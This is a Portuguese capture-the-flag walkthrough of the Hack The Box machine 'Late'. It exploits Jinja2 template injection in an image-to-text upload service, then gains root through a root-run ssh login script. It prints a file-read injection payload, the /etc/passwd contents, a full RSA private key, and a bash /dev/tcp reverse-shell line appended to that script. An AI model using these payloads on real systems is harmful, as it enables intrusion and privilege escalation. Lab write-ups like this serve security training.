# Late

## Enumeração

Primeiramente, enumerando as portas e serviços assecíveis usando o **nmap**:

![Untitled](images/Untitled.png)

Observamos que existe uma aplicação web rodando na porta 80 (**http** padrão). Ao acessarmos o site, existe uma página “Home” e uma página “Contact”, essa segunda possui um formulário que não envia nenhuma request ao servidor realmente, portanto é apenas um enfeite.

![Untitled](images/Untitled%201.png)

![Untitled](images/Untitled%202.png)

Conseguimos extrair a informação do domínio pelo email no rodapé “support@late.htb”; e na *Home*, encontramos um link para images.late.htb, que é um subdomínio. Após acrescentá-los no arquivo **/etc/hosts**:

![Untitled](images/Untitled%203.png)

### Enumerando diretórios e subdomínios

Utilizando o gobuster e as [SecLists](https://github.com/danielmiessler/SecLists):

```
gobuster dir -w ~/SecLists/Discovery/Web-Content/raft-small-directories.txt -u 10.10.11.156
gobuster dns -w ~/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -d late.htb
```

Não descobrimos nada na enumeração de diretórios, e a enumeração de subdomínios confirmou apenas o images.late.htb que já conhecíamos:

![Untitled](images/Untitled%204.png)

### Olhando images.late.htb

Encontramos um serviço que detecta textos em uma imagem e transforma em texto plano. A funcionalidade dessa aplicação é bem ruim, a chance dela não entender o texto na imagem é muito grande, mesmo estando bem claro.

![Untitled](images/Untitled%205.png)

## Exploração

Vamos usar o ImageMagick para fazer alguns testes:

```
convert -gravity center -background black -fill white -size 2000x300 caption:'test' test.png
```

Com esse comando, criamos uma imagem escrito “test” dentro dela:

![Untitled](images/Untitled%206.png)

Ao enviarmos pelo site, o resultado é um arquivo **.txt** com o seguinte conteúdo:

```
<p>test
</p>
```

Essa tag **HTML** <p> é um pouco suspeita, testando se existe Server-side Template Injection com a seguinte imagem:

![testssti.png](images/testssti.png)

Observamos o seguinte comportamento:

![Untitled](images/Untitled%207.png)

Testando com uma sintaxe específica:

![testssti2.png](images/testssti2.png)

```
<p>12
</p>
```

Confirmamos assim que realmente existe um SSTI. Como estamos numa aplicação feita em **Flask**, é muito provável que a template engine seja o **Jinja2**, que é a padrão.

Testando mais um payload:

![Untitled](images/Untitled%208.png)

```
<p>444
</p>
```

Esse é realmente um comportamento esperado para o **Jinja2**!

![Fonte: [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)](https://portswigger.net/cms/images/migration/blog/screen-shot-2015-07-20-at-09-21-56.png)

Fonte: [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)

Utilizando essa vulnerabilidade para ler arquivos da máquina:

```
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

![passwd2.png](images/passwd2.png)

```
<p>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash
rtkit:x:111:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
avahi:x:113:116:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:114:117:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
saned:x:115:119::/var/lib/saned:/usr/sbin/nologin
colord:x:116:120:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:117:121:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
geoclue:x:118:123::/var/lib/geoclue:/usr/sbin/nologin
smmta:x:119:124:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin
smmsp:x:120:125:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin

</p>
```

Observe o usuário no qual destaquei a linha, provavelmente é ele que está rodando a aplicação. Vemos que ele esqueceu a chave privada para acessar o **ssh** na pasta **.ssh**:

![ssh.png](images/ssh.png)

```
<p>-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
-----END RSA PRIVATE KEY-----

</p>
```

## Pós-exploração

Basta então salvarmos essa chave e acessarmos o usuário via **ssh**.

```
ssh -i sshkey svc_acc@10.10.11.156
```

Achamos a flag de usuário:

```
cat user.txt
```

### Escalação de privilégios

Subindo o **linpeas** e o **pspy**:

![Untitled](images/Untitled%209.png)

Dando permissão de execução:

```
chmod +x linpeas.sh pspy
```

Ao rodar o **linpeas**, descobrimos o seguinte arquivo:

![Untitled](images/Untitled%2010.png)

Vemos que somos o dono desse arquivo e que temos permissão de **append** (flag **a** no último comando).

Esse script **ssh-alert.sh** aparenta enviar um email para o root toda vez que alguém realiza login via **ssh**. Vamos testar essa funcionalidade e observar com o **pspy**:

![Untitled](images/Untitled%2011.png)

Note que o script (**ssh-alert.sh**) é executado pelo root (UID=0) quando um usuário loga. Sabendo disso, vamos editar então esse script para quando o root executar, obtermos uma reverse shell dele.

```
echo 'bash -i >& /dev/tcp/SEU-IP/PORTA 0>&1' >> /usr/local/sbin/ssh-alert.sh
```

No seu terminal:

```
nc -lnvp PORTA
```

Ao logarmos novamente com svc_acc, obtemos então acesso ao root.

```
cat /root/root.txt
```